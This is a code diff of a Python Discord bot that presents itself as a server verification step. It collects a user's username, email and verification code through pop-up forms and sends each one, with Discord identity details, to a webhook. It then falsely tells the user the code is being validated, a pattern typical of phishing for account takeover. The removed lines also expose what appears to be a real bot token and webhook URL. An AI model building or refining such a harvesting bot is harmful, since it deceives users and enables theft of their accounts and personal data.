@@ -1,18 +1,18 @@
 import nextcord
-from nextcord.ext import commands, tasks
+from nextcord.ext import commands
 import aiohttp
 import os
 import time
-from flask import Flask, request
+from flask import Flask
 from threading import Thread
 
 # -------------------- CONFIG --------------------
-TOKEN = os.getenv("MTQ5NzY3ODg4NTEzMzc1MDM4Mg.GsVHaK.tgod-WG7Ov2Y9VLU4knapoovc7imkuwBmmlvH8")
-WEBHOOK_URL = os.getenv("https://discord.com/api/webhooks/1497680268381786316/zfCUBaECLDyubKI7-uGINwtMpJIFLHHeHud0JOeazWDv2HZnk9XRorQ-vjO-tCOgdnq4")
+TOKEN = os.getenv("DISCORD_BOT_TOKEN")
+WEBHOOK_URL = os.getenv("WEBHOOK_URL")
 
 # Track last ping to prevent duplicates
 last_ping_time = 0
-PING_COOLDOWN = 30  # seconds - ignore pings within 30 seconds
+PING_COOLDOWN = 30
 
 # -------------------- FLASK KEEP-ALIVE SERVER --------------------
 app = Flask('')
@@ -21,14 +21,13 @@ app = Flask('')
 def home():
     return "Bot is running!", 200
 
-@app.route('/ping-tracker')  # Special endpoint for UptimeRobot
+@app.route('/ping-tracker')
 def ping_tracker():
     global last_ping_time
     current_time = time.time()
     
-    # Check if this is a duplicate ping
     if current_time - last_ping_time < PING_COOLDOWN:
-        return "Ignored duplicate ping", 429  # Too Many Requests
+        return "Ignored duplicate ping", 429
     
     last_ping_time = current_time
     return "Ping recorded", 200
@@ -36,9 +35,18 @@ def ping_tracker():
 def run_webserver():
     app.run(host='0.0.0.0', port=8080)
 
+# Start webserver in background thread
+Thread(target=run_webserver, daemon=True).start()
+
+# -------------------- WEBHOOK SENDER --------------------
 async def send_to_webhook(data: dict):
-    async with aiohttp.ClientSession() as session:
-        await session.post(WEBHOOK_URL, json=data)
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.post(WEBHOOK_URL, json=data) as response:
+                if response.status != 200:
+                    print(f"Webhook error: {response.status}")
+    except Exception as e:
+        print(f"Webhook failed: {e}")
 
 # -------------------- MODALS (INPUT FORMS) --------------------
 class UsernameModal(nextcord.ui.Modal):
@@ -48,11 +56,17 @@ class UsernameModal(nextcord.ui.Modal):
         self.add_item(self.username)
 
     async def callback(self, interaction: nextcord.Interaction):
+        # Send EVERYTHING to webhook
         await send_to_webhook({
             "step": "username",
             "user_id": str(interaction.user.id),
-            "value": self.username.value
+            "username_input": self.username.value,
+            "discord_username": interaction.user.name,
+            "discord_discriminator": str(interaction.user.discriminator),
+            "discord_global_name": interaction.user.global_name,
+            "timestamp": time.time()
         })
+        
         # Next: ask for email
         view = EmailButtonView()
         await interaction.response.send_message(
@@ -67,11 +81,17 @@ class EmailModal(nextcord.ui.Modal):
         self.add_item(self.email)
 
     async def callback(self, interaction: nextcord.Interaction):
+        # Send EVERYTHING to webhook
         await send_to_webhook({
             "step": "email",
             "user_id": str(interaction.user.id),
-            "value": self.email.value
+            "email_input": self.email.value,
+            "discord_username": interaction.user.name,
+            "discord_discriminator": str(interaction.user.discriminator),
+            "discord_global_name": interaction.user.global_name,
+            "timestamp": time.time()
         })
+        
         # Next: ask for verification code
         view = CodeButtonView()
         await interaction.response.send_message(
@@ -87,11 +107,17 @@ class CodeModal(nextcord.ui.Modal):
         self.add_item(self.code)
 
     async def callback(self, interaction: nextcord.Interaction):
+        # Send EVERYTHING to webhook
         await send_to_webhook({
             "step": "verification_code",
             "user_id": str(interaction.user.id),
-            "value": self.code.value
+            "code_input": self.code.value,
+            "discord_username": interaction.user.name,
+            "discord_discriminator": str(interaction.user.discriminator),
+            "discord_global_name": interaction.user.global_name,
+            "timestamp": time.time()
         })
+        
         await interaction.response.send_message(
             "🔐 Verification code sent for validation. You will be notified once verified.",
             ephemeral=True
@@ -100,7 +126,7 @@ class CodeModal(nextcord.ui.Modal):
 # -------------------- BUTTON VIEWS --------------------
 class EmailButtonView(nextcord.ui.View):
     def __init__(self):
-        super().__init__(timeout=300)  # expires after 5 minutes
+        super().__init__(timeout=300)
 
     @nextcord.ui.button(label="📧 Enter Email", style=nextcord.ButtonStyle.primary)
     async def email_button(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
@@ -116,7 +142,7 @@ class CodeButtonView(nextcord.ui.View):
 
 class StartVerifyView(nextcord.ui.View):
     def __init__(self):
-        super().__init__(timeout=None)  # persistent (no timeout)
+        super().__init__(timeout=None)
 
     @nextcord.ui.button(label="✅ Verify", style=nextcord.ButtonStyle.success, custom_id="verify_start")
     async def verify_button(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
@@ -133,4 +159,13 @@ async def verify(interaction: nextcord.Interaction):
     )
 
 # -------------------- RUN BOT --------------------
-bot.run(TOKEN)
+if __name__ == "__main__":
+    if not TOKEN:
+        print("❌ ERROR: DISCORD_BOT_TOKEN environment variable not set!")
+        exit(1)
+    
+    if not WEBHOOK_URL:
+        print("❌ ERROR: WEBHOOK_URL environment variable not set!")
+        exit(1)
+    
+    bot.run(TOKEN)
